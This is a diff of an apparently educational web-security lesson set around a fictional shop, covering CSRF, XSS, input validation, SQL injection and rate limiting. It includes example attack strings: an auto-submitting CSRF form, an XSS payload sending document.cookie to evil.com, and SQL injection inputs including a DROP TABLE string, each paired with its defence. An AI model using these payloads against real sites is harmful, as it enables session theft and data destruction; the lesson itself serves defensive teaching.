+          body: `<p style="margin-bottom:12px;">In a CSRF attack, a malicious website tricks Rahul's browser into making authenticated requests to ShopKart using his real cookies. Since the browser auto-includes cookies on every request, ShopKart can't distinguish Rahul's genuine request from one forged by evil-site.com — unless you use CSRF protections.</p>`,
         },
         {
           icon: "🔍",
           color: "si-purple",
           title: "The Attack",
-          body: `<div class="diagram-box">Attack Scenario:
-  1. Rahul is logged into shopkart.com (session cookie in browser)
-  2. Rahul visits evil-site.com (maybe clicked an email link)
-  3. evil-site.com's HTML contains hidden form:
-     &lt;form action="https://shopkart.com/orders" method="POST"&gt;
-       &lt;input name="product_id" value="999" /&gt;
-       &lt;input name="quantity" value="100" /&gt;
-     &lt;/form&gt;
-     &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
-  4. Browser submits form TO shopkart.com including Rahul's session cookie
-  5. ShopKart sees valid authenticated request → places order!
-  
-Rahul unknowingly bought 100 units of product 999.
-This is CSRF. The browser is weaponised using its own cookie behaviour.</div>`,
+          body: `<p style="margin-bottom:10px;font-size:13px;">The CSRF attack mechanism — browser as an unwitting accomplice:</p>
+
+<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+1. Rahul logged into shopkart.com (his session cookie is in browser)<br/>
+2. Rahul clicks a link → visits evil-site.com<br/>
+3. evil-site.com HTML:<br/>
+   &lt;form action="https://shopkart.com/orders" method="POST"&gt;<br/>
+   &nbsp;&nbsp;&lt;input name="product_id" value="999"/&gt;<br/>
+   &lt;/form&gt;<br/>
+   &lt;script&gt;document.forms[0].submit()&lt;/script&gt;<br/>
+4. Browser submits the form TO shopkart.com<br/>
+   → auto-includes Rahul's session cookie<br/>
+5. ShopKart sees valid authenticated request<br/>
+   → places order! Rahul bought something he didn't intend to.
+</div>`,
         },
         {
           icon: "🏪",
           color: "si-green",
           title: "CSRF Defences",
-          body: `<div class="key-list">
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>SameSite Cookie (Best Defence):</strong> Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on session cookies. Browser will NOT send the cookie when the request originates from a different site. Supported in all modern browsers. This single flag defeats most CSRF attacks.</div></div>
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>CSRF Token:</strong> Server generates a random token per session, embeds it in every form. Server validates this token on every state-changing request. Evil-site.com cannot read this token (same-origin policy), so forged forms lack the valid token.</div></div>
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Origin/Referer Validation:</strong> Check that the request Origin or Referer header matches your domain. Forged cross-origin requests will show evil-site.com as the Origin.</div></div>
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>JSON APIs with custom headers:</strong> Require <code>Content-Type: application/json</code> and <code>X-Requested-With: XMLHttpRequest</code>. HTML forms cannot set custom headers — this separates Ajax requests from form submissions.</div></div>
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(34,197,94,0.06);">
+    <div style="font-weight:700;font-size:13px;color:#22c55e;margin-bottom:4px;">✅ SameSite=Strict (best, modern defence)</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Browser will not send cookie when request originates from a different site. Single flag defeats most CSRF attacks. Supported in all modern browsers.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
+    <div style="font-weight:700;font-size:13px;color:#10b981;margin-bottom:4px;">✅ CSRF Token</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Server embeds random token per session in every form. Validates it on every state-changing request. evil-site.com can't read this token (cross-origin), so forged forms lack it.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
+    <div style="font-weight:700;font-size:13px;color:#8b5cf6;margin-bottom:4px;">✅ Origin/Referer validation</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Check that Origin or Referer header matches your domain. Forged cross-origin requests will show evil-site.com as Origin.</p>
+  </div>
+  <div style="padding:12px 16px;">
+    <div style="font-weight:700;font-size:13px;color:var(--accent);margin-bottom:4px;">✅ JWT in headers (CSRF immune)</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">CSRF requires cookies being auto-sent. JWTs in Authorization headers are NOT auto-sent cross-origin. SPAs using JWTs in headers are inherently CSRF safe.</p>
+  </div>
 </div>`,
         },
         {
           icon: "🎯",
           color: "si-orange",
           title: "Interview Insight",
-          body: `<div class="interview-card"><div class="interview-label">Modern CSRF Defence</div><div class="interview-q">For modern SPAs using JWT in headers (not cookies), CSRF is not a threat — CSRF relies on cookies being auto-sent, and headers are not auto-sent cross-origin. For cookie-based auth, <code>SameSite=Strict</code> is now the primary defence. CSRF tokens are still used for defence-in-depth on critical forms like payments.</div></div>`,
+          body: `<p style="margin-bottom:12px;">For SPAs using JWT in headers: CSRF is not a threat — CSRF exploits cookies being auto-sent, and Authorization headers are NOT auto-sent cross-origin. For cookie-based sessions, <code>SameSite=Strict</code> is now the primary defence. CSRF tokens are still used for defense-in-depth on critical forms like payments. Choose your CSRF protection strategy based on your auth mechanism.</p>`,
         },
       ],
     },
@@ -390,28 +454,54 @@ This is CSRF. The browser is weaponised using its own cookie behaviour.</div>`,
           icon: "🔍",
           color: "si-purple",
           title: "Types of XSS",
-          body: `<div class="info-grid">
-  <div class="info-card red"><div class="info-card-title">Stored XSS (Persistent)</div><p>Attacker submits malicious script as a product review: <code>&lt;script&gt;fetch('evil.com/?c='+document.cookie)&lt;/script&gt;</code>. ShopKart stores it in DB and renders it on the product page. Every user viewing that product runs the attacker's code.</p></div>
-  <div class="info-card yellow"><div class="info-card-title">Reflected XSS</div><p>Malicious script is in the URL: <code>shopkart.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. If ShopKart renders the search query without escaping, the script runs. Attack delivered via phishing link.</p></div>
-  <div class="info-card blue"><div class="info-card-title">DOM-Based XSS</div><p>No server involved — JavaScript reads from URL hash/params and renders to DOM without sanitisation. Entirely client-side vulnerability.</p></div>
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;">
+  <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;font-size:14px;color:#ef4444;margin-bottom:6px;">🚨 Stored XSS (Persistent)</div>
+    <p style="margin:0;font-size:13px;opacity:0.85;line-height:1.65;">Attacker submits malicious script as a product review: <code>&lt;script&gt;fetch('evil.com/?c='+document.cookie)&lt;/script&gt;</code>. ShopKart stores it in DB and renders it on the product page. <strong>Every user viewing that product runs the attacker's code</strong> — steals cookies, logs keystrokes, redirects to phishing.</p>
+  </div>
+  <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(245,158,11,0.04);">
+    <div style="font-weight:700;font-size:14px;color:#f59e0b;margin-bottom:6px;">⏳ Reflected XSS</div>
+    <p style="margin:0;font-size:13px;opacity:0.85;line-height:1.65;">Malicious script is in the URL: <code>shopkart.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. If ShopKart renders the query without escaping, script runs. Attack delivered via phishing link — victim must click the crafted URL.</p>
+  </div>
+  <div style="padding:14px 16px;background:rgba(99,102,241,0.06);">
+    <div style="font-weight:700;font-size:14px;color:var(--accent);margin-bottom:6px;">🔧 DOM-Based XSS</div>
+    <p style="margin:0;font-size:13px;opacity:0.85;line-height:1.65;">No server involved. JavaScript reads from URL hash/params and writes to DOM without sanitisation. Entirely client-side vulnerability. Harder to detect; server never sees the payload.</p>
+  </div>
 </div>`,
         },
         {
           icon: "🏪",
           color: "si-green",
           title: "ShopKart XSS Defences",
-          body: `<div class="key-list">
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Output Encoding (Primary Defence):</strong> Encode all user-supplied data before rendering in HTML. <code>&lt;</code> becomes <code>&amp;lt;</code>. React and modern frameworks do this automatically for JSX expressions. Never use <code>innerHTML</code> or <code>dangerouslySetInnerHTML</code> with user input.</div></div>
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Content Security Policy (CSP):</strong> HTTP header that tells the browser which scripts are allowed to execute. <code>Content-Security-Policy: default-src 'self'</code> blocks all scripts not from your own domain — even successfully injected scripts won't execute.</div></div>
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>HttpOnly cookies:</strong> Session tokens in HttpOnly cookies cannot be accessed by <code>document.cookie</code> — the most common XSS goal (steal session tokens) is defeated.</div></div>
-  <div class="key-item"><div class="key-bullet">✅</div><div><strong>Input Sanitisation on server:</strong> Reject malformed input early. Validate and sanitise HTML (if you allow rich text) using a library like DOMPurify.</div></div>
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(34,197,94,0.06);">
+    <div style="font-weight:700;font-size:13px;color:#22c55e;margin-bottom:4px;">✅ Output Encoding (Primary Defence)</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Encode all user data before rendering in HTML. <code>&lt;</code> becomes <code>&amp;lt;</code>. React does this automatically for JSX. Never use <code>innerHTML</code> or <code>dangerouslySetInnerHTML</code> with user input.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
+    <div style="font-weight:700;font-size:13px;color:#10b981;margin-bottom:4px;">✅ Content Security Policy (CSP)</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">HTTP header dictating which scripts may run. <code>default-src 'self'</code> blocks all scripts not from your domain — even successfully injected scripts won’t execute.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
+    <div style="font-weight:700;font-size:13px;color:#8b5cf6;margin-bottom:4px;">✅ HttpOnly Cookies</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Session tokens in HttpOnly cookies cannot be read by <code>document.cookie</code>. The most common XSS payload goal (steal session) is completely defeated.</p>
+  </div>
+  <div style="padding:12px 16px;">
+    <div style="font-weight:700;font-size:13px;color:var(--accent);margin-bottom:4px;">✅ Server-side Sanitisation</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Reject malformed input early. For rich text fields, sanitise HTML with DOMPurify server-side — never trust client-sent HTML directly.</p>
+  </div>
+</div>
+
+<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
+  <strong style="color:#f59e0b;">🎯 Interview: XSS vs CSRF</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">XSS: attacker injects code that runs in the victim’s browser (attacker’s code, victim’s context). CSRF: attacker tricks the victim’s browser into sending requests using victim’s credentials (victim’s browser, victim’s credentials, attacker’s intent). XSS is generally more dangerous — it can steal credentials, perform actions, and spread virally.</span>
 </div>`,
         },
         {
           icon: "🎯",
           color: "si-orange",
           title: "Interview Insight",
-          body: `<div class="interview-card"><div class="interview-label">XSS vs CSRF</div><div class="interview-q">Common interview question: "What's the difference between XSS and CSRF?" XSS: attacker injects code that runs in the victim's browser (attacker code, victim's context). CSRF: attacker tricks the victim's browser into sending requests using the victim's credentials (victim's browser, victim's credentials, attacker's intent). XSS is generally more dangerous — it can steal credentials, tokens, perform actions, and spread virally.</div></div>`,
+          body: `<p style="margin-bottom:12px;">Defend XSS in depth: output encode everywhere (React JSX handles HTML context automatically), set a strict CSP header, store session tokens in HttpOnly cookies, and sanitise server-side with DOMPurify for any rich-text fields. The combination makes XSS both harder to inject and much less impactful if it does get through.</p>`,
         },
       ],
     },
@@ -438,41 +528,36 @@ This is CSRF. The browser is weaponised using its own cookie behaviour.</div>`,
           icon: "🏪",
           color: "si-green",
           title: "ShopKart Validation Schema",
-          body: `<div class="diagram-box">POST /orders — Request Validation (Zod / Joi schema):
-
-{
-  items: Array({
-    product_id: integer, min: 1           ← must be positive integer
-    quantity: integer, min: 1, max: 100   ← business rule: max 100 units
-  }), min: 1, max: 50                     ← max 50 distinct items per order
-
-  shipping_address: {
-    name:    string, min: 2, max: 100     ← required, length bounds
-    street:  string, min: 5, max: 200
-    city:    string, min: 2, max: 100
-    pincode: string, regex: /^\d{6}$/     ← exactly 6 digits
-    state:   enum: [valid Indian state names]
-    phone:   string, regex: /^[6-9]\d{9}$/ ← Indian mobile format
-  }
-
-  payment_method: enum: ["UPI", "CARD", "COD", "WALLET"]
-  coupon_code: string, optional, max: 20, regex: /^[A-Z0-9-]+$/
-}
-
-Validation Failures → 422 with field-level errors:
-  { "field": "items[0].quantity", "code": "MAX_EXCEEDED", "max": 100 }
-  { "field": "shipping_address.pincode", "code": "INVALID_FORMAT" }</div>`,
+          body: `<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+POST /orders — Zod / Joi validation schema:<br/><br/>
+items: Array(min:1, max:50) of {<br/>
+&nbsp;&nbsp;product_id: integer, min:1<br/>
+&nbsp;&nbsp;quantity:   integer, min:1, max:100<br/>
+}<br/><br/>
+shipping_address: {<br/>
+&nbsp;&nbsp;name:    string, min:2, max:100<br/>
+&nbsp;&nbsp;pincode: regex /^\d{6}$/ ← exactly 6 digits<br/>
+&nbsp;&nbsp;phone:   regex /^[6-9]\d{9}$/ ← Indian mobile<br/>
+&nbsp;&nbsp;state:   enum [valid Indian states]<br/>
+}<br/><br/>
+payment_method: enum ["UPI","CARD","COD","WALLET"]<br/><br/>
+Validation failures → 422 Unprocessable Entity:<br/>
+{ field: "items[0].quantity", code: "MAX_EXCEEDED", max: 100 }<br/>
+{ field: "shipping_address.pincode", code: "INVALID_FORMAT" }
+</div>`,
         },
         {
           icon: "⚠️",
           color: "si-red",
           title: "SQL Injection — Validate Your Queries",
-          body: `<div class="callout danger"><span class="callout-icon">🚨</span><strong>Never interpolate user input into SQL strings.</strong><br>
-BAD: <code>db.query("SELECT * FROM products WHERE name = '" + userInput + "'")</code><br>
-If userInput = <code>Nike' OR '1'='1</code> → returns ALL products.<br>
-If userInput = <code>Nike'; DROP TABLE products; --</code> → destroys your database.<br><br>
-ALWAYS: <code>db.query("SELECT * FROM products WHERE name = $1", [userInput])</code><br>
-Parameterised queries send value as data, never as SQL syntax. No exceptions.</div>`,
+          body: `<div style="background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.25);border-left:4px solid #ef4444;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;margin-bottom:14px;">
+  <strong style="color:#ef4444;">🚨 Never interpolate user input into SQL strings</strong><br/><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">❌ BAD: <code>db.query("SELECT * FROM products WHERE name = '" + userInput + "'")</code></span><br/>
+  <span style="font-size:12px;opacity:0.75;">userInput = <code>Nike' OR '1'='1</code> → returns ALL products<br/>
+  userInput = <code>Nike'; DROP TABLE products; --</code> → destroys DB</span><br/><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">✅ ALWAYS: <code>db.query("SELECT * FROM products WHERE name = $1", [userInput])</code></span><br/>
+  <span style="font-size:12px;opacity:0.75;">Parameterised queries send value as data, never as SQL syntax. No exceptions.</span>
+</div>`,
         },
       ],
     },
@@ -493,41 +578,49 @@ Parameterised queries send value as data, never as SQL syntax. No exceptions.</d
           icon: "🔍",
           color: "si-purple",
           title: "Rate Limiting Algorithms",
-          body: `<table class="compare-table"><thead><tr><th>Algorithm</th><th>How It Works</th><th>Pros</th><th>Cons</th></tr></thead><tbody>
-<tr><td><strong>Fixed Window</strong></td><td>Count requests per minute. Reset at minute boundary.</td><td>Simple</td><td>Burst at window boundary: 200 req in 2 seconds straddling the window</td></tr>
-<tr><td><strong>Sliding Window</strong></td><td>Count requests in the last N seconds relative to now</td><td>Smoother, no boundary burst</td><td>Slightly more complex (stored as timestamp list)</td></tr>
-<tr><td><strong>Token Bucket</strong></td><td>Bucket fills at constant rate. Each request consumes one token. Burst up to bucket size.</td><td>Allows controlled bursting. Most flexible.</td><td>More state to maintain</td></tr>
-<tr><td><strong>Leaky Bucket</strong></td><td>Requests queued; processed at fixed rate. Excess dropped.</td><td>Perfectly smooth output</td><td>Adds latency. Not suited for APIs (use for traffic shaping).</td></tr>
-</tbody></table>`,
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(99,102,241,0.06);">
+    <div style="font-weight:700;font-size:13px;color:var(--accent);margin-bottom:4px;">Fixed Window</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Count requests per minute; reset at boundary. Simple. Weakness: 200 req split across boundary — effectively double the limit in 2 seconds.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(16,185,129,0.04);">
+    <div style="font-weight:700;font-size:13px;color:#10b981;margin-bottom:4px;">Sliding Window</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Count requests in the last N seconds relative to now. Smoother, no boundary burst. Slightly more storage (timestamp list per user in Redis).</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(34,197,94,0.06);">
+    <div style="font-weight:700;font-size:13px;color:#22c55e;margin-bottom:4px;">Token Bucket ★ recommended</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Bucket fills at constant rate. Each request consumes one token. Burst up to bucket size allowed. Most flexible — handles bursts gracefully, prevents sustained abuse.</p>
+  </div>
+  <div style="padding:12px 16px;">
+    <div style="font-weight:700;font-size:13px;color:#8b5cf6;margin-bottom:4px;">Leaky Bucket</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Requests queued; processed at fixed rate. Excess dropped. Perfectly smooth output. Adds latency — better for traffic shaping than API rate limiting.</p>
+  </div>
+</div>`,
         },
         {
           icon: "🏪",
           color: "si-green",
           title: "ShopKart Rate Limit Design",
-          body: `<div class="diagram-box">ShopKart Rate Limits (implemented via Redis + API Gateway):
-
-Public APIs (unauthenticated, by IP):
-  GET /products      → 100 req/min per IP
-  GET /search        → 30 req/min per IP (expensive query)
-
-Authenticated APIs (by user ID):
-  General endpoints  → 600 req/min per user
-  POST /orders       → 10 req/hour per user (prevent order spam)
-  POST /reviews      → 5 per product per day per user
-
-API Key (third-party sellers):
-  Seller API         → 1000 req/min per API key (paid tier)
-  Seller API         → 100 req/min per API key  (free tier)
-
-Headers returned with every response:
-  X-RateLimit-Limit:     100       ← total limit
-  X-RateLimit-Remaining: 73        ← requests left in window
-  X-RateLimit-Reset:     1741421460 ← unix timestamp when window resets
-
-On limit exceeded:
-  HTTP 429 Too Many Requests
-  Retry-After: 23                  ← seconds until limit resets
-  {"error": {"code": "RATE_LIMIT_EXCEEDED", "message": "..."}}</div>`,
+          body: `<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+ShopKart rate limits (Redis + API Gateway):<br/><br/>
+Public (unauthenticated, by IP):<br/>
+&nbsp;&nbsp;GET /products → 100 req/min per IP<br/>
+&nbsp;&nbsp;GET /search   → 30 req/min per IP (expensive)<br/><br/>
+Authenticated (by user ID):<br/>
+&nbsp;&nbsp;General       → 600 req/min<br/>
+&nbsp;&nbsp;POST /orders  → 10 req/hour (prevent spam)<br/>
+&nbsp;&nbsp;POST /reviews → 5/product/day<br/><br/>
+API Key (sellers):<br/>
+&nbsp;&nbsp;Paid tier     → 1000 req/min<br/>
+&nbsp;&nbsp;Free tier     → 100 req/min<br/><br/>
+Response headers:<br/>
+&nbsp;&nbsp;X-RateLimit-Limit:     100<br/>
+&nbsp;&nbsp;X-RateLimit-Remaining: 73<br/>
+&nbsp;&nbsp;X-RateLimit-Reset:     1741421460 (unix ts)<br/><br/>
+Exceeded → HTTP 429 Too Many Requests<br/>
+&nbsp;&nbsp;Retry-After: 23 (seconds)<br/>
+&nbsp;&nbsp;{ "code": "RATE_LIMIT_EXCEEDED" }
+</div>`,
         },
         {
           icon: "🧠",
@@ -539,7 +632,10 @@ On limit exceeded:
           icon: "🎯",
           color: "si-orange",
           title: "Interview Insight",
-          body: `<div class="interview-card"><div class="interview-label">Rate Limiting Design</div><div class="interview-q">When asked to design rate limiting: "Redis-based token bucket per user ID. Each user gets a bucket of 100 tokens. Tokens replenish at 1/second. Each API request consumes 1 token. On empty bucket → 429 with Retry-After header. Redis EVAL script ensures atomic check-and-decrement. Rate limits are enforced at the API gateway so app servers are protected even from clients that bypass the gateway." Cover the algorithm, the storage mechanism, and the response handling.</div></div>`,
+          body: `<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
+  <strong style="color:#f59e0b;">🎯 Interview: Rate Limiting Design</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">"Redis-based token bucket per user ID. Each user gets a bucket of 100 tokens replenishing at 1/second. Each request consumes 1 token. Empty bucket → 429 with Retry-After header. Redis EVAL script ensures atomic check-and-decrement. Enforced at API gateway so app servers are protected even from clients bypassing the gateway." Cover algorithm + storage mechanism + response handling.</span>
+</div>`,
         },
       ],
     },
